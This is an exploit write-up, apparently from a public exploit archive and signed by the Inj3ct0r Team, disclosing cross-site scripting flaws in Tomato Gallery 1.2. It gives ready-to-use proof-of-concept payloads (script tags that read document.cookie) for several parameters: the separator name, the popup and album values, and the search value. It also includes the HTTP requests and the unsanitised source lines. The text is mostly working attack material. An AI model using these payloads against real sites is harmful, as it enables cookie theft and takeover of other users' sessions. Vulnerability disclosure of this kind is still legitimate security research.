# software link: http://tomatogallery.yzx.se/
# version: 1.2
# tested on: linux
#cve :

poc0.1 :


1. http://localhost/www/cmsadmins/tomato_gallery_1_2/edit/index.php

2. click @ "Add Separator" and type: bla&#039;&#039;;!--<script>alert(

document.cookie)</script>=&{()} in the box

3. persistant.


try:

POST http://localhost/www/cmsadmins/tomato_gallery_1_2/ajaxinfo/addSeparator.php

?separatorName=bla&#039;&#039;;!--<script>alert(document.cookie)</script>=&{()} HTTP/1.1

more:

cat -n $tomato_dir/ajaxinfo/addSeparator.php

--- <ut ------ <ut ------ <ut ------ <ut ---

11     $albumName =     $_GET["separatorName"];

--- <ut ------ <ut ------ <ut ------ <ut ---

... and more, enjoy! o/

* csrf?

poc0.2 :

POST http://localhost/www/cmsadmins/tomato_gallery_1_2/ajaxinfo/popupSource.php?popup=create-album&album=undefined HTTP/1.1

;]

in second line of ajaxinfo/popupSource.php we see:

$popup = $_GET[&#039;popup&#039;];


replace &#039;create-album&#039; to: &#039;&#039;script


in source of generated page find your alert:

<li id="item_0" style="margin:0; padding:0; list-style:none;" lang="test;!--<script>alert(document.cookie)</script>=">
<div class="group" onMouseOver="hoverAlbum(&#039;in&#039;,&#039;1&#039;)" onMouseOut="hoverAlbum(&#039;out&#039;,&#039;1&#039;)" id="album1">
<div class="stripe"></div>
<div class="albumText" style="position:absolute;" id="albumText1"
onclick="this.innerHTML = this.lang" lang="test&#039;;!--<script>alert(document.cookie)</script>=">test&#039;;!--<script>alert(document.cookie)</script>=
</div>

file inputs?

 

poc0.3 : some error when typing:

http://localhost/www/cmsadmins/tomato_gallery_1_2/edit/index.php?album=%27%27;!--%3Cscript%3Ealert%28document.cookie%29%3C/script%3E=&{%28%29}#

 

poc0.4 : xss via GET

 
$search = &#039;&#039;;!--<script>alert(document.cookie)</script>=&{()}


regards Inj3ct0r Team!

